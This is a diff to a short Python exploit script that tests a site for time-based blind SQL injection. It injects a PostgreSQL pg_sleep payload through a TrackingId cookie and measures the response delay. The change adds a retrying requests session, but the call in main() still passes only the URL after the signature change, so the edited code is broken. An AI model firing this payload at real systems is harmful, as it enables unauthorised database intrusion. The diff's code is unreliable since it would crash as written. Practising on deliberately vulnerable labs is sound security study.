@@ -1,12 +1,13 @@
 import requests
 import sys
+from requests.adapters import HTTPAdapter, Retry
 
 
 
-def time_based_sqli_check(url):
+def time_based_sqli_check(url, session):
     try:
         payload ="' || (SELECT pg_sleep(10))--"
-        response = requests.get(url, cookies={"TrackingId": payload}, timeout=20)
+        response = session.get(url, cookies={"TrackingId": payload}, timeout=20)
 
         if response.elapsed.total_seconds() > 9:
             print("(+) Time based SQL injection attack successfully completed.")
@@ -33,6 +34,9 @@ def main():
         sys.exit(1)
 
     url = sys.argv[1]
+    session = requests.Session()
+    session.mount("https://", HTTPAdapter(max_retries=Retry(total=3, backoff_factor=0.1)))
+
     print("(+) Attempting time based SQL Injection attack...")
     time_based_sqli_check(url)
 
